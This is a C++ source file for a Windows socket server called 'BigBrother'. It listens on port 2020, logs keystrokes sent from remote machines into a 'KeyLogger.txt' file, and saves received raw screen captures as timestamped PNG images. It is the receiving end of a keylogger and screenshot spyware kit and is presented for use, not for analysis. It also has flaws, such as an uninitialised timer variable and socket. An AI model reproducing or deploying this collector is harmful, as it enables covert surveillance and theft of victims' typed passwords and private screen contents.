#include "BigBrother.hpp"

#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"

Server server;


double wtime()
{
    struct timeval t;
    gettimeofday(&t, NULL);

    return (double)t.tv_sec + (double)t.tv_usec * 1E-6;
}


string getDate()
{
    time_t now = time(0);
    tm *ltm = localtime(&now);
    std::string date = "";
    date += to_string(ltm->tm_mday) + "_" + to_string(1 + ltm->tm_mon) + "_" + to_string(1900 + ltm->tm_year) + "_";
    date += to_string(1 + ltm->tm_hour) + "_" + to_string(1 + ltm->tm_min) + "_" + to_string(1 + ltm->tm_sec);
    return date;
}


void Server::StopServer()
{
    closesocket(sock);
    WSACleanup();
    cout << "server was stopped" << endl;
}


void Server::StartServer()
{
    int iResult = WSAStartup(MAKEWORD(2,2), &wData);
    if (iResult != NO_ERROR) {
        cout << "WSA startup failed" << endl;
        return;
    }

    SOCKADDR_IN addr;
    int addrl = sizeof(addr);

    addr.sin_addr.S_un.S_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    sock = socket(AF_INET, SOCK_STREAM, NULL);

    if (sock == SOCKET_ERROR)
        cout << "socket not created" << endl;

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR)
        cout << "socket bind successfully" << endl;

    if (listen(sock, SOMAXCONN) != SOCKET_ERROR)
		cout << "start listening at port: "  << ntohs(addr.sin_port) << endl;

    handle();
}


void Server::screenshot_handle()
{
    int buf_size = 6220800;
    char *buf = new char[buf_size];
    SOCKET clientS;
    SOCKADDR_IN addr_c;
    int addrlen = sizeof(addr_c);

    bool data_recieved = false;

    while (!data_recieved) {
        if ((clientS = accept(sock, (struct sockaddr*)&addr_c, &addrlen)) != 0) {
            data_recieved = true;
            int RecvSize = recv(clientS, buf, buf_size, NULL);
            //cout << "Size: " << RecvSize << endl;

            string save_path = "ServerLogs/screenshots/" + getDate() + ".png";

            switch (RecvSize) {
                case 921600:
                    stbi_write_png(save_path.c_str(), 640, 480, 3, buf, 640 * 3);
                    break;
                case 2359296:
                    stbi_write_png(save_path.c_str(), 1024, 768, 3, buf, 1024 * 3);
                    break;
                case 2764800:
                    stbi_write_png(save_path.c_str(), 1280, 720, 3, buf, 1280 * 3);
                    break;
                case 2949120:
                    stbi_write_png(save_path.c_str(), 1280, 768, 3, buf, 1280 * 3);
                    break;
                case 3932160:
                    stbi_write_png(save_path.c_str(), 1280, 1024, 3, buf, 1280 * 3);
                    break;
                case 3888000:
                    stbi_write_png(save_path.c_str(), 1440, 900, 3, buf, 1440 * 3);
                    break;
                case 4320000:
                    stbi_write_png(save_path.c_str(), 1600, 900, 3, buf, 1600 * 3);
                    break;
                case 5292000:
                    stbi_write_png(save_path.c_str(), 1680, 1050, 3, buf, 1680 * 3);
                    break;
                case 6220800:
                    stbi_write_png(save_path.c_str(), 1920, 1080, 3, buf, 1920 * 3);
                    break;
                default:
                    stbi_write_png(save_path.c_str(), 1920, 1080, 3, buf, 1920 * 3);
                    break;
            }
        }
    }
    delete [] buf;
}




void Server::handle()
{
    ofstream fout("ServerLogs/KeyLogger.txt");
    bool isExit = false;

    while (!isExit)
    {
        char buf[100] = "";
        SOCKET clientS;
        SOCKADDR_IN addr_c;
        int addrlen = sizeof(addr_c);

        double no_message_time;

        if (wtime() - no_message_time > 30)
            closesocket(clientS);

        if ((clientS = accept(sock, (struct sockaddr*)&addr_c, &addrlen)) != 0) {
            // printf("client connected: %u.%u.%u.%u:%u\n",
			// 	(unsigned char)addr_c.sin_addr.S_un.S_un_b.s_b1,
			// 	(unsigned char)addr_c.sin_addr.S_un.S_un_b.s_b2,
			// 	(unsigned char)addr_c.sin_addr.S_un.S_un_b.s_b3,
			// 	(unsigned char)addr_c.sin_addr.S_un.S_un_b.s_b4,
			// 	ntohs(addr_c.sin_port));
            int RecvSize = recv(clientS, buf, sizeof(buf), NULL);

            if (strcmp(buf, "screenshot") == 0) {
                screenshot_handle();
                continue;
            }

            for (int i = 0; i < RecvSize; i++) {
                cout << buf[i];
                fout << buf[i];
            }
            cout << endl;
            fout << endl;

            no_message_time = wtime();
        }
    }
}


int main()
{
    server.port = 2020;
    server.StartServer();

    return 0;
}
